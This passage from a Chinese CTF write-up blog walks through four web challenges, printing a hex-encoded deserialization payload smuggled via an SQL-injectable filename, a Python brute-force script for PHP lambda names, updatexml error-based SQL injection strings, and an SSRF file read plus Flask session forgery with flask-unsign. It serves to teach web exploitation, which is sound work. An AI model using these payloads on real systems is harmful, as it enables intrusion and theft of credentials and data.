class="hljs-string">&quot;)&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>实际<code>SQL</code>语句就是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> images (`title`,`filename`,`ext`,`path`,`attr`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;xx&#x27;</span>,<span class="hljs-string">&#x27;xx&#x27;</span>,<span class="hljs-string">&#x27;xx&#x27;</span>,<span class="hljs-string">&#x27;xx&#x27;</span>,<span class="hljs-string">&#x27;xx&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>文件名可控，构造文件名为：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">a<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;payload&#x27;</span>)<span class="hljs-meta">#.jpg</span><br></code></pre></td></tr></table></figure>

<p>的图片。</p>
<p>后面就是思考如何利用<code>helper.php</code>中的<code>__destruct()</code>和<code>view_files</code>。注意一开始的定义：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = False; <br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;config.txt&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>构造：反序列化自动触发<code>__destruct()</code>然后调用<code>view_files</code></p>
<p>所以可以构造：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = True;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;/flag&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//注意ifview和config是protected属性，存在不可见字符</span><br></code></pre></td></tr></table></figure>

<p>以及这么个东西：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$attr_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);<br></code></pre></td></tr></table></figure>

<p>这里把<code>attr</code>中的<code>不可见*不可见</code>全部替换成<code>\0\0\0</code>了，所以要想办法绕过。(一开始没想明白为啥有这么一个<code>waf</code>。。做到这里明白了)</p>
<p>然后就是一个小知识点：</p>
<blockquote>
<p>mysql会自动将十六进制转化为字符串，这也是sql注入的可利用点</p>
</blockquote>
<p>构造：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = True;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;/flag&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">helper</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>

<p>最终<code>payload</code>，注意<code>SQL</code>语句中进制数据没必要用单引号双引号闭合最后一个字段:</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">a&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,0x4f3a363a<span class="hljs-number">226865</span>6c<span class="hljs-number">70657222</span>3a323a7b733a393a<span class="hljs-number">2200</span>2a<span class="hljs-number">00696676696577</span>223b623a313b733a393a<span class="hljs-number">2200</span>2a<span class="hljs-number">0063</span>6f6e<span class="hljs-number">66696722</span>3b733a353a222f666c<span class="hljs-number">616722</span>3b7d)#.jpg<br></code></pre></td></tr></table></figure>

<h4 id="总结思路："><a href="#总结思路：" class="headerlink" title="总结思路："></a>总结思路：</h4><p>如何考虑反序列化的入口和终点？<code>protected</code>属性在反序列化时应注意什么？除此以外，<code>private</code>属性呢？变量覆盖？<code>SQL</code>语句中进制形式的数据是否有必要使用单引号或双引号括起来？</p>
<h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-number">32</span>));<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function SUCTF_<span class="hljs-subst">$hash</span>()&#123;&quot;</span><br>    .<span class="hljs-string">&quot;global \$MY;&quot;</span><br>    .<span class="hljs-string">&quot;\$MY();&quot;</span><br>    .<span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>]();<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure>

<p>利用<code>create_function</code>创建了一个函数然后给<code>$MY</code>。再利用<code>eval</code>创建了一个函数的定义：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SUCTF_</span>$<span class="hljs-title">hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">global</span> \<span class="hljs-variable">$MY</span>;<br>\<span class="hljs-variable">$MY</span>();<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>然后<code>GET</code>传参<code>func_name</code>，可以进行函数调用：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">if</span>(isset($_GET[&#x27;func_name&#x27;]))&#123;<br>    $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&quot;func_name&quot;</span>]</span>();<br>    <span class="hljs-built_in">die</span>();<br></code></pre></td></tr></table></figure>

<p>所以现在的问题就是<code>$hash = bin2hex(openssl_random_pseudo_bytes(32))</code>这个东西。。这个伪随机数不知道怎么 处理。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105225558">参考资料</a></p>
<p><a target="_blank" rel="noopener" href="https://yang1k.github.io/post/2018-suctf/">参考资料</a></p>
<blockquote>
<p>create_function的匿名函数也是有名字的，名字是\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$MY</span>);<br><span class="hljs-comment">//输出string(9) &quot;(我是一个不可见字符)lambda_1&quot;，后面的数字是随机变的。</span><br></code></pre></td></tr></table></figure>

<p>可以用<code>burp</code>的<code>intruder</code>模块爆破，或者写个<code>python</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://e50c90bb-2a05-4887-8d21-139d4eaa33de.node5.buuoj.cn:81/&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">5000</span>):<br>    payload = <span class="hljs-string">&quot;\x00lambda_&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    get_data = &#123;<span class="hljs-string">&quot;func_name&quot;</span>: payload&#125;<br>    res = requests.get(url, params=get_data, timeout=<span class="hljs-number">5</span>)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure>

<h4 id="思路总结：-1"><a href="#思路总结：-1" class="headerlink" title="思路总结："></a>思路总结：</h4><p><code>create_function</code>？匿名函数的名字是什么？</p>
<h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>进去就是个报错：</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">Warning: mysqli_connect(): (HY000/2002): Connection refused in /var/www/html/index.php on line 2<br><span class="hljs-keyword">Error: </span>Unable to connect to MySQL. Debugging errno: 2002 Debugging error: Connection refused<br></code></pre></td></tr></table></figure>

<p><code>index.php</code>：</p>
<p><img src="/img/roosterctfbabyweb1.png" srcset="/img/loading.gif" lazyload alt="roosterctfbabyweb1"></p>
<p>ban了单引号双引号，<code>union</code>,<code>or</code>,<code>sleep</code>这几个关键字。</p>
<p>后来测试发现<code>information</code>这东西并没有过滤。</p>
<p><code>1 order by 3#</code>返回 <code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code>,<code>order by 2</code>正常。一共两列。</p>
<p>试了下报错注入：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">updatexml(<span class="hljs-number">1</span>%<span class="hljs-number">2</span>Cconcat(<span class="hljs-number">0x7e</span>%<span class="hljs-number">2</span>Cdatabase()%<span class="hljs-number">2</span>C0x7e)%<span class="hljs-number">2</span>C1)%<span class="hljs-number">23</span><br>//XPATH syntax error: <span class="hljs-string">&#x27;~sql_injection~&#x27;</span><br>updatexml(<span class="hljs-number">1</span>%<span class="hljs-number">2</span>Cconcat(<span class="hljs-number">0x7e</span>%<span class="hljs-number">2</span>C(<span class="hljs-keyword">select</span>+<span class="hljs-built_in">table_name</span>+<span class="hljs-keyword">from</span>+information_schema.<span class="hljs-keyword">tables</span>+<span class="hljs-keyword">where</span>+table_schema%<span class="hljs-number">3</span>Ddatabase()+<span class="hljs-keyword">limit</span>+<span class="hljs-number">0</span>%<span class="hljs-number">2</span>C1)%<span class="hljs-number">2</span>C0x7e)%<span class="hljs-number">2</span>C1)<br>//XPATH syntax error: <span class="hljs-string">&#x27;~users~&#x27;</span><br><br>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-type">char</span>(<span class="hljs-number">117</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">115</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) #这里有个问题，users一定要写成<span class="hljs-type">char</span>的形式才有回显。。不知道为啥<br>//XPATH syntax error: <span class="hljs-string">&#x27;~USER,CURRENT_CONNECTIONS,TOTAL_&#x27;</span><br>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))<br>//<span class="hljs-keyword">admin</span>,john<br>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(uniqueid) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br>//<span class="hljs-number">837461526918364526</span>,<span class="hljs-number">123456789928</span><br><br></code></pre></td></tr></table></figure>

<p>输入<code>837461526918364526</code>这个<code>uniqueid</code>即可。</p>
<p>后面看其它师傅的<code>wp</code>直接用这种万能密码登录：</p>
<p><code>1 || 1=1 limit 0,1</code> ，这时<code>SQL</code>语句就变成了：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> uniqueid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">||</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p><code>uniqueid</code>这东西一共两列，<code>admin</code>对应的还在第一列。所以<code>limit 0,1</code>就相当查的<code>837461526918364526</code>对应的结果，或者：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> uniqueid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">||</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> limit <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h4 id="总结思路"><a href="#总结思路" class="headerlink" title="总结思路:"></a>总结思路:</h4><p><code>updatexml</code>报错注入？<code>char</code>形式绕过？若过滤了<code>or</code>，万能密码应如何构造？</p>
<h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p><img src="/img/ciscnweb4-1.png" srcset="/img/loading.gif" lazyload alt="ciscnweb4-1"></p>
<p><code>read somethings</code>跳转，注意<code>URL</code>：</p>
<p><code>http://23348a06-4528-47fb-8442-d0428080c651.node5.buuoj.cn:81/read?url=https://baidu.com</code></p>
<p><img src="/img/ciscnweb4-2.png" srcset="/img/loading.gif" lazyload alt="ciscnweb4-2"></p>
<p>输入不存在的<code>URL</code>会提示<code>no response</code>：</p>
<p><img src="/img/ciscnweb4-4.png" srcset="/img/loading.gif" lazyload alt="ciscnweb4-4"></p>
<p>尝试读下<code>/etc/passwd</code>:</p>
<p><img src="/img/ciscnweb4-5.png" srcset="/img/loading.gif" lazyload alt="ciscnweb4-5"></p>
<p>直接读<code>flag</code>发现被过滤了:</p>
<p><img src="/img/ciscnweb4-6.png" srcset="/img/loading.gif" lazyload alt="ciscnweb4-6"></p>
<p>利用base64编码执行下：<code>echo L2ZsYWc=|base64 -d</code>，结果返回了<code>no response</code>。。然后想起刚才<code>glzjin</code>这个用户的家目录是<code>/app</code>，尝试读取<code>app.py</code>:</p>
<blockquote>
<p><strong>url&#x2F;read?id&#x3D;xxxx这种在url和参数中间又会有一段字符串的，可以考虑是写了路由，不是php后端，可能是python后端</strong></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 导入模块</span><br>encoding:utf-<span class="hljs-number">8</span> <br><span class="hljs-keyword">import</span> re, random, uuid, urllib <br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request<br><br><span class="hljs-comment"># 创建 Flask 应用和配置</span><br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random() * <span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">True</span><br><br><span class="hljs-comment"># 定义根路径路由</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;www-data&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello World! Read somethings&#x27;</span><br><br><span class="hljs-comment"># 定义读取路径路由</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        m = re.findall(<span class="hljs-string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)<br>        n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br>        <br>        <span class="hljs-comment"># 检查是否包含敏感关键词</span><br>        <span class="hljs-keyword">if</span> m <span class="hljs-keyword">or</span> n:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No Hack&#x27;</span><br>        <br>        <span class="hljs-comment"># 尝试打开给定的 URL 并返回内容</span><br>        res = urllib.urlopen(url)<br>        <span class="hljs-keyword">return</span> res.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(ex))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no response&#x27;</span><br><br><span class="hljs-comment"># 定义获取 flag 路由</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">and</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;fuck&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>).read()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access denied&#x27;</span><br><br><span class="hljs-comment"># 主程序</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>代码倒是不长，首先<code>URL</code>不允许出现<code>flag</code>和以<code>file</code>开头。最开始定义<code>session[&#39;username&#39;] = &#39;www-data&#39;</code>，在访问<code>/flag</code>路由时如果<code>if session and session[&#39;username&#39;] == &#39;fuck&#39;:</code>即可。另外注意到这东西开了<code>debug</code>模式，后面看看能不能通过构造<code>pin</code>码解题。</p>
<p>看下对密钥<code>SECRET_KEY</code>是怎么构造的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random() * <span class="hljs-number">233</span>)<br></code></pre></td></tr></table></figure>

<p>用本地计算机的网络硬件地址（MAC地址）作为随机数生成器的种子，生成一个伪随机的浮点数（在 0 到 233 之间），将其转换为字符串。所以想办法读<code>MAC</code>地址就行：</p>
<p><img src="/img/ciscnweb4key1.png" srcset="/img/loading.gif" lazyload alt="ciscnweb4key1"></p>
<p>这里我看<code>wp</code>都是直接去读了<code>eth0</code>网卡。。不是很懂为啥</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">/read?url=/sys/<span class="hljs-keyword">class</span>/<span class="hljs-symbol">net</span>/<span class="hljs-symbol">eth0</span>/<span class="hljs-symbol">address</span><br>结果：<span class="hljs-symbol">aa:<span class="hljs-symbol">31</span>:<span class="hljs-symbol">08</span>:<span class="hljs-symbol">a5</span>:<span class="hljs-symbol">b9</span>:<span class="hljs-symbol">2b</span></span><br></code></pre></td></tr></table></figure>

<p>拿到MAC地址就能生成种子(注意这里要用python2，2和3保留的位数不一样)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment"># Write Python 2 code in this online editor and run it.</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> uuid<br><br><span class="hljs-comment"># 假设的MAC地址</span><br>example_mac_address = <span class="hljs-string">&#x27;aa:31:08:a5:b9:2b&#x27;</span><br><br><span class="hljs-comment"># 转换MAC地址为整数</span><br>mac_integer = <span class="hljs-built_in">int</span>(example_mac_address.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>), <span class="hljs-number">16</span>)<br><br><span class="hljs-comment"># 使用MAC地址整数初始化随机数生成器的种子</span><br>random.seed(mac_integer)<br><br><span class="hljs-comment"># 生成0到233之间的随机浮点数</span><br>random_float = random.random() * <span class="hljs-number">233</span><br><br><span class="hljs-comment"># 将生成的随机浮点数作为字符串赋值给应用程序的SECRET_KEY</span><br>app_config_secret_key = <span class="hljs-built_in">str</span>(random_float)<br><br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAC地址整数:&quot;</span>, mac_integer) <span class="hljs-comment">#MAC是十六进制的，直接把它转为整数</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;生成的随机浮点数:&quot;</span>, random_float)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;应用程序的SECRET_KEY:&quot;</span>, app_config_secret_key)<br><span class="hljs-comment"># 结果：22.4625144346</span><br></code></pre></td></tr></table></figure>

<p>抓包看下<code>SESSION</code>:</p>
<p><code>eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.ZZkYxw.byfbQe9w4mPGETQZMlAOtQgjckI</code></p>
<p>放<code>FLASK-UNSIGN</code>里：</p>
<p><img src="/img/ciscnweb4key2flag.png" srcset="/img/loading.gif" lazyload alt="ciscnweb4key2flag"></p>
<p>顺便记录下用法：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flask-unsign <span class="hljs-attr">--unsign</span> <span class="hljs-attr">--decode</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.ZbCRbw.VSVb2deVeKAEUTAotx5adFSrhgY&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;42e9&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br><br>flask-unsign <span class="hljs-attr">--sign</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;&#123;&#x27;username&#x27;: b&#x27;fuck&#x27;&#125;&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;22.4625144346&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br><br>&#123;<span class="hljs-string">&#x27;balance&#x27;</span>: <span class="hljs-number">1336</span>, <span class="hljs-string">&#x27;purchases&#x27;</span>: <span class="hljs-selector-attr">[]</span>&#125;<br>flask-unsign <span class="hljs-attr">--sign</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;&#123;&#x27;balance&#x27;: 1338, &#x27;purchases&#x27;: []&#125;&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;ijbufup9Ma6ZKnCWzvhodHqVjNMPk6Nw4NTNnbdr&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br></code></pre></td></tr></table></figure>

<p>然后访问<code>/flag</code>路由改下session字段就行</p>
<p><code>PIN</code>码构造参考这位师傅的文章：<code>https://xz.aliyun.com/t/11647?page=1</code></p>
<h4 id="总结思路-1"><a href="#总结思路-1" class="headerlink" title="总结思路:"></a>总结思路:</h4><p><code>/etc/passwd</code>下是否由可用信息？家目录在哪？url和参数中间存在字符串时是否要考虑写了路由？MAC地址获取？伪随机数？</p>
